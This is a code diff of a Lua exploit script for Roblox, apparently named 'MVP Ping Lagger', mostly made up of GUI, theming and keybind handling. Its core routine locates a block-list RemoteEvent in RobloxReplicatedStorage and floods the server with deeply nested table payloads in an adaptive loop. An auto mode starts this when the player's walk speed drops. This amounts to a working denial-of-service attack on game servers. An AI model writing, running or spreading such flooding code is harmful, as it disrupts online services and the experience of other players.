+        powerBox.Text    = tostring(cfg.power)
+        intervalBox.Text = tostring(cfg.interval)
+        updateKbLabels()
+        if autoBrainrotBtn then
+            autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
+            autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and C.green or Color3.fromRGB(60,20,20)
+        end
+    end
+
+    local function closeSettings()
+        settingsOpen = false
+        listeningFor = nil
+        updateKbLabels()
+        tw(settingsFrame, {Size=UDim2.new(0,SET_W,0,0)}, 0.16)
+        task.delay(0.18, function() settingsFrame.Visible = false end)
+        tw(settingsEmojiBtn, {BackgroundColor3=Color3.fromRGB(55, 18, 22)}, 0.12)
+        hideConfirm()
+    end
+
+    settingsEmojiBtn.MouseButton1Click:Connect(function()
+        if settingsOpen then closeSettings() else openSettings() end
+    end)
+    setCloseBtn.MouseButton1Click:Connect(closeSettings)
+
+    -- ══════════════════════════════════════════════════════════════════════
+    -- PING LAGGER LOGIC
+    -- ══════════════════════════════════════════════════════════════════════
+    local function findRemote()
+        local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+        if not rrs then return nil end
+        local remote
+        for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
+            local r = rrs:FindFirstChild(name)
+            if r and r:IsA("RemoteEvent") then remote = r break end
+        end
         if not remote then
-            remote = findRemote()
+            for _, c in ipairs(rrs:GetChildren()) do
+                if c:IsA("RemoteEvent") and c.Name:find("Block") then remote = c break end
+            end
+        end
+        return remote
+    end
+
+    remote = findRemote()
+
+    local function buildPayload(power)
+        local main = {}
+        local nested = {{}}
+        local current = nested[1]
+        for _ = 1, 186 do
+            local n = {}
+            table.insert(current, n)
+            current = n
+        end
+        local maxRep = math.min(math.floor(power / 188), 10000)
+        for _ = 1, maxRep do
+            table.insert(main, nested)
+        end
+        return main
+    end
+
+    local function runPingLoop()
+        local delay = cfg.interval
+        while active and remote do
+            local payload = buildPayload(cfg.power)
+            local ok = pcall(function() remote:FireServer(payload) end)
+            if not ok then
+                delay = math.min(delay * 1.5, 0.5)
+            else
+                delay = math.max(delay * 0.995, 0.05)
+            end
+            task.wait(delay)
+        end
+    end
+
+    local function flipLag(state, isManual)
+        active = state
+
+        if isManual then
+            if brainrotMode then
+                manualOverride = not state
+            else
+                manualOverride = false
+            end
+        end
+
+        if active then
             if not remote then
-                active = false
-                updateToggleButton()
-                return
-            end
-        end
-        updateToggleButton()
-        task.spawn(runPingLoop)
-    else
-        updateToggleButton()
-    end
-end
-
-applyAccentColors = function()
-    local accent = getAccent()
-    local textColor = getText()
-    local strokeColor = getStroke()
-    local accentDim = accent:Lerp(Color3.new(0,0,0), 0.4)
-    local rowBg = Color3.new(accent.R*0.2, accent.G*0.2, accent.B*0.2)
-    local rowBoxBg = Color3.new(accent.R*0.15, accent.G*0.15, accent.B*0.15)
-    local tabAct = Color3.new(accent.R*0.3, accent.G*0.3, accent.B*0.3)
-    local tabInact = Color3.new(accent.R*0.1, accent.G*0.1, accent.B*0.1)
-
-    mainStroke.Color = strokeColor
-    ss.Color = strokeColor
-    aStroke.Color = strokeColor
-    resetStroke.Color = strokeColor
-
-    local function walk(obj)
-        if not obj then return end
-        local skipSelf = (obj.Name:find("^colorDot") ~= nil or obj.Name == "statusPill" or obj.Name == "statusLbl" or obj.Name == "autoBrainrotBtn" or obj.Name == "brainrotKnob")
-        local skipParent = (obj.Parent == statusPill or obj.Parent == autoBrainrotBtn)
-        if not skipSelf and not skipParent then
-            if obj:IsA("TextLabel") then
-                if obj == titleLbl then
-                    obj.TextColor3 = strokeColor
-                    obj.TextStrokeColor3 = strokeColor:Lerp(Color3.new(0,0,0), 0.55)
-                elseif obj == setTitle then
-                    obj.TextColor3 = strokeColor
-                    obj.TextStrokeColor3 = strokeColor:Lerp(Color3.new(0,0,0), 0.6)
-                else
-                    obj.TextColor3 = textColor
-                end
-            elseif obj:IsA("TextButton") then
-                if obj == activateBtn then
-                    obj.BackgroundColor3 = rowBg
-                    obj.TextColor3 = textColor
-                elseif obj == tabPower then
-                    if powerPage.Visible then
-                        obj.BackgroundColor3 = tabAct
-                        obj.TextColor3 = strokeColor
-                    else
-                        obj.BackgroundColor3 = tabInact
-                        obj.TextColor3 = textColor
-                    end
-                elseif obj == tabSettings then
-                    if settingsPage.Visible then
-                        obj.BackgroundColor3 = tabAct
-                        obj.TextColor3 = strokeColor
-                    else
-                        obj.BackgroundColor3 = tabInact
-                        obj.TextColor3 = textColor
-                    end
-                elseif obj == tabConfig then
-                    if configPage.Visible then
-                        obj.BackgroundColor3 = tabAct
-                        obj.TextColor3 = strokeColor
-                    else
-                        obj.BackgroundColor3 = tabInact
-                        obj.TextColor3 = textColor
-                    end
-                elseif obj == resetBtn then
-                    obj.BackgroundColor3 = rowBg
-                    obj.TextColor3 = textColor
-                elseif obj == keybindKbRow or obj == keybindGpRow or obj == bgRow or obj == setCloseBtn then
-                    obj.BackgroundColor3 = rowBoxBg
-                    obj.TextColor3 = strokeColor
-                elseif obj == lockBtn and uiLocked then
-                    obj.BackgroundColor3 = strokeColor
-                    obj.TextColor3 = strokeColor:Lerp(Color3.new(0,0,0), 0.7)
-                else
-                    obj.BackgroundColor3 = rowBg
-                    obj.TextColor3 = textColor
-                end
-            elseif obj:IsA("TextBox") then
-                obj.BackgroundColor3 = rowBoxBg
-                obj.TextColor3 = strokeColor
-            elseif obj:IsA("Frame") then
-                if obj == mainFrame or obj == settingsFrame or obj == darkOverlay or obj == settingsOverlay then
-                    obj.BackgroundColor3 = Color3.fromRGB(0,0,0)
-                elseif obj == header or obj == setHeader or obj == btnContainer or obj == tabBar or obj == pagesFrame or obj == powerPage or obj == settingsPage or obj == configPage or obj == mainContent or obj == profileRow then
-                else
-                    obj.BackgroundColor3 = rowBg
+                remote = findRemote()
+                if not remote then
+                    active = false
+                    flipLag(false)
+                    return
                 end
             end
-            for _, st in ipairs(obj:GetChildren()) do
-                if st:IsA("UIStroke") then
-                    st.Color = strokeColor
-                end
+            activateGrad.Color = ColorSequence.new({
+                ColorSequenceKeypoint.new(0,C.gold2),
+                ColorSequenceKeypoint.new(1,C.gold3),
+            })
+            activateLbl.Text            = "ACTIVATED"
+            activateStroke.Color        = C.white
+            activateStroke.Transparency = 0
+            statusLbl.Text              = "ON"
+            statusLbl.TextColor3        = C.green
+            tw(statusPill, {BackgroundColor3=Color3.fromRGB(12, 55, 28)}, 0.2)
+            mainStroke.Color            = C.green
+            mainStroke.Transparency     = 0.1
+            task.spawn(runPingLoop)
+        else
+            activateGrad.Color = ColorSequence.new({
+                ColorSequenceKeypoint.new(0,C.gold1),
+                ColorSequenceKeypoint.new(1,C.gold2),
+            })
+            activateLbl.Text            = "ACTIVATE"
+            activateStroke.Color        = C.gold3
+            activateStroke.Transparency = 0.4
+            statusLbl.Text              = "OFF"
+            statusLbl.TextColor3        = C.red
+            tw(statusPill, {BackgroundColor3=Color3.fromRGB(70, 20, 25)}, 0.2)
+            mainStroke.Color            = C.gold1
+            mainStroke.Transparency     = 0.35
+        end
+    end
+
+    activateBtn.MouseButton1Click:Connect(function()
+        flipLag(not active, true)
+    end)
+    activateBtn.MouseEnter:Connect(function()
+        if not active then tw(activateBtn,{BackgroundColor3=Color3.fromRGB(120, 35, 40)},0.1) end
+    end)
+    activateBtn.MouseLeave:Connect(function()
+        if not active then tw(activateBtn,{BackgroundColor3=C.card},0.1) end
+    end)
+
+    -- ══════════════════════════════════════════════════════════════════════
+    -- AUTO BRAINROT DETECTION
+    -- ══════════════════════════════════════════════════════════════════════
+    RunService.Heartbeat:Connect(function()
+        if not cfg.autoBrainrot then
+            if brainrotMode then
+                brainrotMode = false
+                lastBrainrotState = false
             end
+            return
         end
-        for _, child in ipairs(obj:GetChildren()) do
-            walk(child)
-        end
-    end
-    walk(screen)
-    if activePowerButton and backupPowerButton then refreshPowerProfile() end
-    if not active then
-        ag.Color = ColorSequence.new({
-            ColorSequenceKeypoint.new(0, accentDim),
-            ColorSequenceKeypoint.new(1, accent)
-        })
-    end
-end
 
-activateBtn.MouseButton1Click:Connect(function()
-    flipLag(not active, true)
-end)
+        local char = plr.Character
+        if not char then return end
+        local hum = char:FindFirstChild("Humanoid")
+        if not hum then return end
 
-lockBtn.MouseButton1Click:Connect(function()
-    uiLocked = not uiLocked
-    local strokeColor = getStroke()
-    local accent = getAccent()
-    if uiLocked then
-        lockBtn.Text = "🔒"
-        lockBtn.BackgroundColor3 = strokeColor
-        lockBtn.TextColor3 = strokeColor:Lerp(Color3.new(0,0,0), 0.7)
-        mainStroke.Transparency = 0.05
-    else
-        lockBtn.Text = "🔓"
-        lockBtn.BackgroundColor3 = Color3.new(accent.R*0.2, accent.G*0.2, accent.B*0.2)
-        lockBtn.TextColor3 = getText()
-        mainStroke.Transparency = 0.2
-    end
-end)
+        local hasBrainrot = hum.WalkSpeed < 25
 
-minimizeBtn.MouseButton1Click:Connect(function()
-    if pingMinimized then
-        pingMinimized = false
-        mainContent.Visible = true
-        mainFrame.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
-        minimizeBtn.Text = "—"
-    else
-        pingMinimized = true
-        mainContent.Visible = false
-        mainFrame.Size = UDim2.new(0, MAIN_W, 0, MIN_HEIGHT)
-        minimizeBtn.Text = "+"
-    end
-end)
-
-gearBtn.MouseButton1Click:Connect(function()
-    settingsFrame.Visible = not settingsFrame.Visible
-end)
-
-RunService.Heartbeat:Connect(function()
-    if not cfg.autoBrainrot then
-        if brainrotMode then
-            brainrotMode = false
-            lastBrainrotState = false
-            if active then flipLag(false, false) end
-        end
-        return
-    end
-    local char = plr.Character
-    if not char then return end
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    if not hum then return end
-    local currentSpeed = hum.WalkSpeed
-    if currentSpeed < 25 then
-        if not lastBrainrotState then
+        if hasBrainrot and not lastBrainrotState then
             brainrotMode = true
             lastBrainrotState = true
             manualOverride = false
-            if not active then flipLag(true, false) end
-        end
-    else
-        if lastBrainrotState then
+            flipLag(true)
+        elseif not hasBrainrot and lastBrainrotState then
             brainrotMode = false
             lastBrainrotState = false
             manualOverride = false
-            if active then flipLag(false, false) end
+            flipLag(false)
         end
-    end
-end)
+    end)
 
-UserInputService.InputBegan:Connect(function(input, gp)
-    if gp then return end
-    local kc = input.KeyCode
-    if kc == Enum.KeyCode.Unknown then return end
-    local isKb = input.UserInputType == Enum.UserInputType.Keyboard
-    local isGp = isGamepadKeyCode(kc)
+    -- ══════════════════════════════════════════════════════════════════════
+    -- INPUT HANDLER
+    -- ══════════════════════════════════════════════════════════════════════
+    UserInputService.InputBegan:Connect(function(input, processed)
+        local kc  = input.KeyCode
+        if kc == Enum.KeyCode.Unknown then return end
 
-    if listeningFor then
-        local newKey = nil
-        if isKb then newKey = kc
-        elseif isGp then newKey = kc end
-        if newKey and not BLACKLISTED[kc] then
-            if listeningFor == "gp" then
-                cfg.keybindGp = newKey.Name
-                keybindGpRow.Text = newKey.Name
-            else
-                cfg.keybindKb = newKey.Name
-                keybindKbRow.Text = newKey.Name
+        local isGp = isGamepad(kc)
+        local isKb = input.UserInputType == Enum.UserInputType.Keyboard
+
+        if listeningFor then
+            if kc == Enum.KeyCode.Escape then
+                listeningFor = nil
+                updateKbLabels()
+                return
             end
-            listeningFor = nil
-            saveConfig()
+            if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
+                cfg.keybindKb = kc.Name
+                listeningFor  = nil
+                updateKbLabels()
+                saveConfig()
+                return
+            end
+            if listeningFor == "gp" and isGp then
+                cfg.keybindGp = kc.Name
+                listeningFor  = nil
+                updateKbLabels()
+                saveConfig()
+                return
+            end
+            return
         end
-        return
-    end
 
-    if kc == Enum.KeyCode.LeftControl then
-        mainFrame.Visible = not mainFrame.Visible
-        if not mainFrame.Visible then settingsFrame.Visible = false end
-        return
-    end
+        if processed then return end
 
-    local kbEnum = resolveKb(cfg.keybindKb)
-    local gpEnum = resolveKb(cfg.keybindGp)
-    if (kbEnum and kc == kbEnum and isKb) or (gpEnum and kc == gpEnum and isGp) then
-        flipLag(not active, true)
-    end
-end)
+        if kc == Enum.KeyCode.LeftControl then
+            mainFrame.Visible = not mainFrame.Visible
+            if not mainFrame.Visible then closeSettings() end
+            return
+        end
 
-tabPower.MouseButton1Click:Connect(function()
-    selectTab("power")
-    applyAccentColors()
-end)
+        local kbEnum = resolveKb(cfg.keybindKb)
+        local gpEnum = resolveKb(cfg.keybindGp)
 
-tabSettings.MouseButton1Click:Connect(function()
-    selectTab("settings")
-    applyAccentColors()
-end)
-tabConfig.MouseButton1Click:Connect(function()
-    selectTab("config")
-    applyAccentColors()
-end)
+        if (kbEnum and kc == kbEnum and isKb)
+        or (gpEnum and kc == gpEnum and isGp) then
+            flipLag(not active, true)
+        end
+    end)
 
-if tonumber(savedUi.bgIndex) then
-    bgIndex = math.max(1, math.min(math.floor(savedUi.bgIndex), #BG_LIST))
-    local restoredId = getBgId()
-    mainBgImage.Image = restoredId
-    settingsBgImage.Image = restoredId
-    if bgRow then bgRow.Text = getBgName() end
+    updateKbLabels()
+    _MVPPingLaggerScreen = screen
+    return screen
 end
-if tonumber(savedUi.colorIndex) then colorIndex = math.max(1, math.min(math.floor(savedUi.colorIndex), #COLOR_OPTIONS)) end
-if type(savedUi.customStroke) == "table" then
-    customStroke = Color3.new(tonumber(savedUi.customStroke[1]) or 1, tonumber(savedUi.customStroke[2]) or 1, tonumber(savedUi.customStroke[3]) or 1)
-end
-if updateColorDots then updateColorDots() end
 
-active = false
-pingLoopRunning = false
-brainrotMode = false
-lastBrainrotState = false
-updateToggleButton()
-selectTab("power")
-applyAccentColors()
+-- Auto open al ejecutar
+openMVPPingLagger()
